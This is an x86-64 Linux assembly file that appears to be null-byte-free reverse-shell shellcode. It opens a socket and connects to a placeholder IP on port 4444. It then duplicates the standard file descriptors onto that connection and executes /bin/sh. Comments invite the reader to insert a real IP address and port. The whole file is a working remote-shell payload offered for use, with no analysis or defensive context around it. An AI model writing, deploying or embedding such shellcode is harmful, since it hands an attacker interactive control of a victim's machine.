global _start

section .text
_start:
    xor edi, edi
    mov dil, 2
    xor esi, esi
    mov sil, 1
    xor edx, edx

    xor eax, eax
    mov al, 41
    syscall

    mov rdi, rax
    xor eax, eax
    push rax
    mov dword [rsp-4], 0x63636363 ; replace with actual ip address (0 -> 00 null byte -> not allow in shellcode)
    sub rsp, 4
    push word 0x5c11 ; port 4444 (replace with any port you want)
    push word 2
    mov rsi, rsp
    mov dl, 16

    xor eax, eax
    mov al, 42
    syscall

    xor rsi, rsi
    mov sil, 2

dup2_loop:    
    xor eax, eax
    mov al, 33
    syscall
    dec sil
    jns dup2_loop

    xor rbx, rbx
    push rbx
    push rbx
    add dword [rsp], 0x69622F2F
    add dword [rsp+4], 0x68732F6E
    mov rdi, rsp

    xor rax, rax
    push rax
    push rdi
    mov rsi, rsp

    xor rdx, rdx

    xor eax, eax
    mov al, 59
    syscall

    xor eax, eax
    mov al, 60
    syscall